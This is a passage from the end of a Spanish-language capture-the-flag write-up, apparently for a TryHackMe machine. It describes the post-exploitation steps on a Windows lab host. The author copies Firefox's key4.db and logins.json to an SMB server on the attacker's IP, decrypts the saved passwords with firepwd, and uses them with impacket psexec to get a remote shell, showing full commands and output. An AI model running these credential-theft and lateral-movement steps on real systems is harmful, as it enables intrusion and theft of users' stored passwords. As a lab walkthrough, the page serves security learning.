</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\n</span>atbat<span class=se>\A</span>ppData<span class=se>\R</span>oaming<span class=se>\M</span>ozilla<span class=se>\F</span>irefox<span class=se>\P</span>rofiles<span class=se>\l</span>jfn812a.default-release<span class=se>\p</span>laces.sqlite
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\n</span>atbat<span class=se>\A</span>ppData<span class=se>\R</span>oaming<span class=se>\M</span>ozilla<span class=se>\F</span>irefox<span class=se>\P</span>rofiles<span class=se>\l</span>jfn812a.default-release<span class=se>\p</span>refs.js
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\n</span>atbat<span class=se>\A</span>ppData<span class=se>\R</span>oaming<span class=se>\M</span>ozilla<span class=se>\F</span>irefox<span class=se>\P</span>rofiles<span class=se>\l</span>jfn812a.default-release<span class=se>\p</span>rotections.sqlite
</span></span><span class=line><span class=cl>...
</span></span></code></pre></div><p>Entre todos los archivos me llaman la atención los de los Profiles de firefox, ya que pueden contener credenciales guardadas en el navegador.</p><p>Para extraer las credenciales usaremos: https://github.com/lclevy/firepwd.</p><p>En el README de la herramienta, explican que para usar este script hay que tener el archivo key4.db o key3.db y logins.json o signons.sqlite</p><pre tabindex=0><code>key4.db (or key3.db), logins.json (or signons.sqlite).
</code></pre><p>Para pasarnos los archivos de la máquina víctima hacia nuestra máquina, abrimos un servidor samba</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>impacket-smbserver smb <span class=k>$(</span><span class=nb>pwd</span><span class=k>)</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\n</span>atbat&gt;copy C:<span class=se>\U</span>sers<span class=se>\n</span>atbat<span class=se>\A</span>ppData<span class=se>\R</span>oaming<span class=se>\M</span>ozilla<span class=se>\F</span>irefox<span class=se>\P</span>rofiles<span class=se>\l</span>jfn812a.default-release<span class=se>\k</span>ey4.db <span class=se>\\</span>10.9.3.29<span class=se>\s</span>mb<span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>        <span class=m>1</span> file<span class=o>(</span>s<span class=o>)</span> copied.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\n</span>atbat&gt;copy C:<span class=se>\U</span>sers<span class=se>\n</span>atbat<span class=se>\A</span>ppData<span class=se>\R</span>oaming<span class=se>\M</span>ozilla<span class=se>\F</span>irefox<span class=se>\P</span>rofiles<span class=se>\l</span>jfn812a.default-release<span class=se>\l</span>ogins.json <span class=se>\\</span>10.9.3.29<span class=se>\s</span>mb<span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>        <span class=m>1</span> file<span class=o>(</span>s<span class=o>)</span> copied.
</span></span></code></pre></div><p>Ejecutamos el script de firepwd</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ python3 firepwd.py 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>....
</span></span><span class=line><span class=cl>....
</span></span><span class=line><span class=cl>....
</span></span><span class=line><span class=cl>https://creds.com:b<span class=s1>&#39;mayor&#39;</span>,b<span class=err>&#39;</span>PASS
</span></span></code></pre></div><p>Podemos probar de usar estas credenciales con psexec</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 /usr/share/doc/python3-impacket/examples/psexec.py gatekeeper/mayor:PASS@10.10.165.175 cmd.exe
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Impacket v0.12.0.dev1 - Copyright <span class=m>2023</span> Fortra
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Requesting shares on 10.10.165.175.....
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Found writable share ADMIN$
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Uploading file BrrdIOeQ.exe
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Opening SVCManager on 10.10.165.175.....
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Creating service kZEY on 10.10.165.175.....
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Starting service kZEY.....
</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> Press <span class=nb>help</span> <span class=k>for</span> extra shell commands
</span></span><span class=line><span class=cl>Microsoft Windows <span class=o>[</span>Version 6.1.7601<span class=o>]</span>
</span></span><span class=line><span class=cl>Copyright <span class=o>(</span>c<span class=o>)</span> <span class=m>2009</span> Microsoft Corporation.  All rights reserved.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt;
</span></span></code></pre></div><p>Estamos dentro!!!!</p><p>Máquina completada :)</p><div class="page-footer-meta d-flex flex-column flex-md-row justify-content-between"></div><div class="page-nav d-flex flex-column flex-sm-row"><div class="card w-100"><div class="card-body d-flex"><div class="d-flex flex-column justify-content-center"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-left" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 12h14"/><path d="M5 12l6 6"/><path d="M5 12l6-6"/></svg></div><div class="d-flex flex-column"><div class=text-body-secondary>Prev</div><a href=/writeups/intro/bienvenido/ class="stretched-link text-reset text-decoration-none">Bienvenido</a></div></div></div><div class=m-2></div><div class="card text-end w-100"><div class="card-body d-flex justify-content-end"><div class="d-flex flex-column"><div class=text-body-secondary>Next</div><a href=/writeups/tryhackme/cyberlens/ class="stretched-link text-reset text-decoration-none">Cyberlens</a></div><div class="d-flex flex-column justify-content-center"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-right" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 12h14"/><path d="M13 18l6-6"/><path d="M13 6l6 6"/></svg></div></div></div></div></main></div></div></div><footer class="footer text-muted"><div class=container-lg><div class=row><div class="col-lg-8 text-center text-lg-start"><ul class=list-inline><li class=list-inline-item><a class=text-muted href=/tags/>Tags</a></li></ul></div><div class="col-lg-8 text-center text-lg-end"><ul class=list-inline><li class=list-inline-item>Brought to you by <a class=text-muted href=https://gethyas.com/>Hyas</a></li></ul></div></div></div></footer><script async src=/js/app.1e84dcdaa5ccef6fe83f6d88ac1e444a1f237111cfa2a7a97427f758e9c27ef4.js integrity="sha256-HoTc2qXM72/oP22IrB5ESh8jcRHPoqepdCf3WOnCfvQ="></script><script async src=/js/flexsearch.78e4b7a9456a2770bd6faffb1f6488b30db12ca157c3df4e89e3ae2e258888ae.js integrity="sha256-eOS3qUVqJ3C9b6/7H2SIsw2xLKFXw99OieOuLiWIiK4="></script><script async src=/js/search-modal.c4c023efcdee308e4b5f1110afe1db6b1656f217e67aa7efe54e2f4bf2feccf8.js integrity="sha256-xMAj783uMI5LXxEQr+HbaxZW8hfmeqfv5U4vS/L+zPg="></script><div class="d-inline-flex fixed-bottom-right pb-4 pe-4"><button id=toTop type=button class="btn btn-primary rounded-circle ms-auto p-2"><span class=visually-hidden>Top</span><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-up" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 15l6-6 6 6"/></svg></button></div><script src=/js/main.js></script></body></html>